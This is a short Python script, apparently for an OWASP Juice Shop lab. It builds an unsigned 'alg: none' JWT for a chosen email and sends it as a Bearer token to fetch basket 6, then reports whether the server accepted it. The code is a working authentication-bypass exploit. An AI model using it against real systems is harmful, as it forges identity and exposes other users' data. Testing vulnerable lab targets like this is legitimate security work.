#!/usr/bin/env python3
"""Check whether the lab accepts a short-lived unsigned JWT for a basket GET."""

# Run on the target server against the isolated Juice Shop container.
import base64
import getpass
import json
import sys
import time
import urllib.error
import urllib.request


BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:3000"
email = getpass.getpass("Account A email (hidden): ").strip()

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


now = int(time.time())
unsigned_header = b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
unsigned_payload = b64url(json.dumps({
    "data": {"email": email},
    "iat": now,
    "exp": now + 300,
}, separators=(",", ":")).encode())
unsigned_token = unsigned_header + "." + unsigned_payload + "."
request = urllib.request.Request(
    f"{BASE}/rest/basket/6",
    headers={"Authorization": "Bearer " + unsigned_token, "Accept": "application/json"},
)
try:
    response = urllib.request.urlopen(request, timeout=10)
except urllib.error.HTTPError as error:
    response = error
result = json.loads(response.read())
returned_id = result.get("data", {}).get("id")
print(f"Unsigned-token request: HTTP {response.status}; returned basket ID={returned_id}")
if response.status == 200 and str(returned_id) == "6":
    print("RESULT: unsigned JWT was accepted for the read-only basket request.")
elif response.status in (401, 403):
    print("RESULT: unsigned JWT was rejected.")
else:
    print("RESULT: review needed; response did not match the expected patterns.")
